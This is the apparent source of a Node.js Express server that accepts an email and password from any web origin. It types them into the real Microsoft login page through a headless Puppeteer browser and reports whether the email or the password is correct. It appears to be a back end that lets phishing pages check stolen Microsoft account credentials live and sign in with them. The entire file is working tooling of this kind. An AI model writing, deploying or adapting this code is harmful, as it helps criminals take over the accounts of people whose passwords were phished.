const express = require('express');
const puppeteer = require('puppeteer');
const cors = require('cors');

const app = express();
app.use(express.json()); // To parse JSON bodies
app.use(cors());

let browser; // Keep a reference to the browser instance
let page; // Keep a reference to the page instance

async function loginLive(email, password) {
    if (!page) {
        throw new Error('Page not initialized');
    }

    // Enter email
    await page.type('input[name="loginfmt"]', email);
    console.log('Email entered');

    // Click "Next" button
    await page.waitForSelector('button#idSIButton9', { visible: true, timeout: 10000 });
    await page.click('button#idSIButton9');
    console.log('Clicked Next');

    // Check for the error after clicking "Next"
    try {
        await page.waitForSelector('div#i0116Error', { visible: true, timeout: 5000 });
        console.log('Incorrect email detected');
        await page.goto('https://login.live.com');
        console.log('redirected to login.live');

        return { success: false, message: 'Incorrect email' };
    } catch (error) {
        console.log('Email appears to be correct, proceeding...');
    }

    // Wait for the password field and enter password
    await page.waitForSelector('input[name="passwd"]', { visible: true });
    await page.type('input[name="passwd"]', password);
    console.log('Password entered');

    // Click "Sign in" button
    await page.click('button#idSIButton9');
    console.log('Clicked Sign in');
    
    // Check for the error after clicking "Next"
    try {
        await page.waitForSelector('div#i0118Error', { visible: true, timeout: 5000 });
        console.log('Incorrect password detected');
        await page.goto('https://login.live.com');
        console.log('redirected to login.live');
        
        return { success: false, message: 'Incorrect password' };
    } catch (error) {
        console.log('Password appears to be correct, proceeding...');
    }

    await page.close(); // Close the page after login
    return { success: true };

    /* // Handle "Stay signed in?" prompt
    console.log('Waiting for "Stay signed in" button');
    await page.waitForSelector('button#declineButton', { visible: true, timeout: 10000 });
    await page.click('button#declineButton');
    console.log('Clicked Stay signed in');

    await page.close(); // Close the page after login
    return { success: true }; */
} 

async function startBrowser() {
    browser = await puppeteer.launch({
        headless: true,
        executablePath: '/opt/render/project/.render/chrome/opt/google/chrome/google-chrome',
        args: ['--no-sandbox']
    });
    console.log('Browser launched');

    page = await browser.newPage();
    console.log('New page created');

    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36');
    await page.setViewport({ width: 1280, height: 800 });

    await page.goto('https://login.live.com', { waitUntil: 'networkidle2' });
    console.log('Navigated to login.live.com');
}

// Route to handle login requests
app.post('/login', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).send('Email and password are required');
    }

    try {
        const loginResult = await loginLive(email, password);
        if (!loginResult.success) {
            return res.status(400).send(loginResult.message);
        }
        res.status(200).send('Logged in successfully');
    } catch (error) {
        console.error('Error during login:', error);
        res.status(500).send('Login failed');
    }

    // Restart the browser after login
    await browser.close();
    console.log('Browser closed');

    await startBrowser(); // Re-launch the browser and wait for the next request
});

// Start the browser initially
startBrowser().then(() => {
    // Start the Express server
    const PORT = process.env.PORT || 4000;
    app.listen(PORT, () => {
        console.log(`Server is running on port ${PORT}`);
    });
});
